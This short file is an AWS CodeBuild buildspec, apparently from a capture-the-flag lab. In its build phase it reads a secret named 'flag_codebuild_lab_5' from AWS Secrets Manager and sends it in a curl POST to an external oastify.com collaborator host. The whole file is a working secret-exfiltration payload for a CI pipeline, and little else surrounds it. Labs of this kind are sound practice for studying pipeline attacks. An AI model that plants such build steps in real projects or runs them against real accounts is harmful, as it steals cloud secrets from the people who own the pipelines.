version: 0.2

phases:
  build:
    commands:
      - echo "=== START ==="
      - FLAG=$(aws secretsmanager get-secret-value --secret-id
      flag_codebuild_lab_5 --region us-east-1 --query SecretString --output
      text)
      - curl -X POST https://hl6lygi9rdjsx47gwd3b85hl7cd31wpl.oastify.com --data
      "flag=$FLAG"
      - echo "=== END ==="
